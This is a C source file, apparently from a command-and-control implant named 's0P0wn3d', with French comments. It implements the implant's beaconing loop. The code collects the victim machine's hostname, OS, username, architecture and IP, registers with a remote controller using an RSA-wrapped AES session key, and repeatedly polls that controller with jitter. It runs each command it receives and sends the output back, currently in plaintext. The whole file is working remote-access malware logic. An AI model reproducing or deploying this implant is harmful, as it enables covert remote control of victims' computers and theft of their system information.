/*
 * s0P0wn3d — Implémentation de la boucle de beaconing.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include "beacon.h"
#include "transport.h"
#include "crypto.h"
#include "task_runner.h"
#include "../shared/json.h"
#include "../shared/base64.h"

/* Collecte les informations sur la machine cible */
static void collect_host_info(host_info_t *host) {
    memset(host, 0, sizeof(host_info_t));

    /* Hostname */
    DWORD size = sizeof(host->hostname);
    GetComputerNameA(host->hostname, &size);

    /* OS */
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA((LPOSVERSIONINFOA)&osvi);
    snprintf(host->os, sizeof(host->os), "Windows %lu.%lu",
             osvi.dwMajorVersion, osvi.dwMinorVersion);

    /* Username */
    size = sizeof(host->username);
    GetUserNameA(host->username, &size);

    /* Architecture */
    SYSTEM_INFO si = {0};
    GetSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: strcpy(host->arch, "x64"); break;
        case PROCESSOR_ARCHITECTURE_INTEL: strcpy(host->arch, "x86"); break;
        case PROCESSOR_ARCHITECTURE_ARM64: strcpy(host->arch, "ARM64"); break;
        default: strcpy(host->arch, "unknown"); break;
    }

    /* IP locale */
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    struct hostent *he = gethostbyname(hostname);
    if (he && he->h_addr_list[0]) {
        struct in_addr addr;
        memcpy(&addr, he->h_addr_list[0], sizeof(addr));
        strncpy(host->ip, inet_ntoa(addr), sizeof(host->ip) - 1);
    }

    strncpy(host->implant_version, S0P_VERSION, sizeof(host->implant_version) - 1);
}

/* Traite une réponse de tâches du contrôleur */
static void process_tasks_response(const char *response,
                                    const char *session_id,
                                    uint8_t *aes_key) {
    if (!response) return;

    /* Vérifier s'il y a des tâches */
    if (strstr(response, "\"no_tasks\"")) {
        return;
    }

    /* Vérifier si les tâches sont en clair (type: "tasks") ou chiffrées */
    char *plaintext_ptr = NULL;
    uint8_t plaintext_buf[S0P_MAX_PAYLOAD];
    int plaintext_len;

    if (strstr(response, "\"type\":\"tasks\"")) {
        /* Tâches en CLAIR */
        printf("[*] Tâches reçues en clair\n");
        plaintext_ptr = (char *)response;
        plaintext_len = strlen(response);
    } else {
        /* Tâches CHIFFRÉES - extraire et déchiffrer */
        printf("[*] Tâches chiffrées\n");
        char *nonce_b64 = json_extract_string(response, "nonce");
        char *payload_b64 = json_extract_string(response, "payload");
        char *tag_b64 = json_extract_string(response, "tag");

        if (!nonce_b64 || !payload_b64 || !tag_b64) {
            free(nonce_b64); free(payload_b64); free(tag_b64);
            return;
        }

        /* Déchiffrer avec AES-GCM */
        int pt_len = impl_crypto_aes_decrypt(aes_key, nonce_b64, payload_b64,
                                             tag_b64, plaintext_buf, sizeof(plaintext_buf));
        if (pt_len < 0) {
            fprintf(stderr, "[-] Déchiffrement AES-GCM échoué\n");
            free(nonce_b64); free(payload_b64); free(tag_b64);
            return;
        }
        plaintext_buf[pt_len] = '\0';
        plaintext_ptr = (char *)plaintext_buf;
        plaintext_len = pt_len;

        free(nonce_b64); free(payload_b64); free(tag_b64);
    }

    /* Parser les tâches */
    task_t tasks[16];
    int count = json_parse_tasks(plaintext_ptr, tasks, 16);

    printf("[*] %d tâche(s) reçue(s)\n", count);

    /* Exécuter chaque tâche et soumettre le résultat */
    for (int i = 0; i < count; i++) {
        printf("[*] Exécution: %s %s\n", tasks[i].command, tasks[i].args);

        task_result_t result;
        task_runner_execute(&tasks[i], &result);

        printf("    → %s: %.100s\n", result.status, result.output);

        /* Construire le JSON du résultat */
        char *result_json = json_build_result(&result);
        if (!result_json) continue;

        printf("[*] Résultat: %s\n", result_json);

        /* TODO: Chiffrer avec AES-GCM - Pour l'instant: envoyer en clair */
        /* Envoyer en clair (comme les tâches) */
        char *r_nonce = malloc(64);
        char *r_payload = malloc(strlen(result_json) + 1);
        char *r_tag = malloc(64);

        if (r_nonce && r_payload && r_tag) {
            strcpy(r_nonce, "");
            strcpy(r_payload, result_json);
            strcpy(r_tag, "plaintext");

            printf("[*] Envoi du résultat au contrôleur...\n");
            transport_submit_result(session_id, r_nonce, r_payload, r_tag);
        }

        free(r_nonce); free(r_payload); free(r_tag);
        free(result_json);
    }
}

int beacon_loop(const char *controller_host, int controller_port,
                int interval, int jitter) {
    /* Initialiser le transport */
    if (transport_init(controller_host, controller_port) != 0) {
        fprintf(stderr, "[-] Échec de l'initialisation du transport\n");
        return -1;
    }

    /* Récupérer la clé publique RSA du contrôleur */
    printf("[*] Récupération de la clé publique du contrôleur...\n");
    char *pubkey_response = transport_get_pubkey();
    if (!pubkey_response) {
        fprintf(stderr, "[-] Impossible de contacter le contrôleur\n");
        return -1;
    }

    /* Extraire la clé PEM du JSON */
    char *pubkey_pem = json_extract_string(pubkey_response, "public_key_pem");
    free(pubkey_response);
    if (!pubkey_pem) {
        fprintf(stderr, "[-] Clé publique introuvable dans la réponse\n");
        return -1;
    }

    /* Décoder les \n dans le PEM */
    char *real_pem = malloc(strlen(pubkey_pem) * 2 + 1);
    if (real_pem) {
        size_t j = 0;
        for (size_t i = 0; pubkey_pem[i]; i++) {
            if (pubkey_pem[i] == '\\' && pubkey_pem[i + 1] == 'n') {
                real_pem[j++] = '\n';
                i++;
            } else {
                real_pem[j++] = pubkey_pem[i];
            }
        }
        real_pem[j] = '\0';
    }

    /* Charger la clé publique RSA */
    if (impl_crypto_load_pubkey(real_pem ? real_pem : pubkey_pem) != 0) {
        fprintf(stderr, "[-] Impossible de charger la clé publique RSA\n");
        free(pubkey_pem); free(real_pem);
        return -1;
    }
    free(pubkey_pem); free(real_pem);

    /* Générer la clé AES de session */
    uint8_t aes_key[AES_KEY_SIZE];
    impl_crypto_gen_aes_key(aes_key);

    /* Collecter les informations hôte */
    host_info_t host;
    collect_host_info(&host);

    printf("[*] Hostname: %s\n", host.hostname);
    printf("[*] OS: %s\n", host.os);
    printf("[*] User: %s\n", host.username);
    printf("[*] IP: %s\n", host.ip);

    /* Chiffrer la clé AES avec RSA */
    char *encrypted_key = impl_crypto_encrypt_aes_key(aes_key);
    if (!encrypted_key) {
        fprintf(stderr, "[-] Échec du chiffrement de la clé AES\n");
        return -1;
    }

    /* Enregistrer l'implant */
    printf("[*] Enregistrement auprès du contrôleur %s:%d...\n",
           controller_host, controller_port);
    char *register_response = transport_register(encrypted_key, &host);
    free(encrypted_key);

    if (!register_response) {
        fprintf(stderr, "[-] Échec de l'enregistrement\n");
        return -1;
    }

    /* Extraire le session_id du JSON */
    char *session_id = json_extract_string(register_response, "session_id");
    free(register_response);

    if (!session_id) {
        fprintf(stderr, "[-] Session ID introuvable dans la réponse\n");
        return -1;
    }

    printf("[+] Enregistré ! Session ID: %s\n", session_id);
    printf("[*] Démarrage de la boucle de beaconing (%ds + jitter %ds)\n",
           interval, jitter);

    /* Boucle de beaconing */
    int heartbeat_count = 0;
    while (1) {
        heartbeat_count++;
        printf("[*] Heartbeat #%d...\n", heartbeat_count);

        /* Poll les tâches */
        printf("[*] Fetching tasks...\n");
        char *tasks_response = transport_fetch_tasks(session_id);
        if (tasks_response) {
            printf("[+] Response received: %.100s\n", tasks_response);
            process_tasks_response(tasks_response, session_id, aes_key);
            free(tasks_response);
        } else {
            printf("[-] No response from controller\n");
        }

        /* Sleep avec jitter aléatoire */
        int sleep_time = interval;
        if (jitter > 0) {
            sleep_time += (rand() % (jitter * 2 + 1)) - jitter;
        }
        printf("[*] Sleeping for %d seconds...\n\n", sleep_time);
        Sleep(sleep_time * 1000);
    }

    /* Nettoyage (jamais atteint en pratique) */
    transport_cleanup();
    impl_crypto_cleanup();
    free(session_id);
    return 0;
}
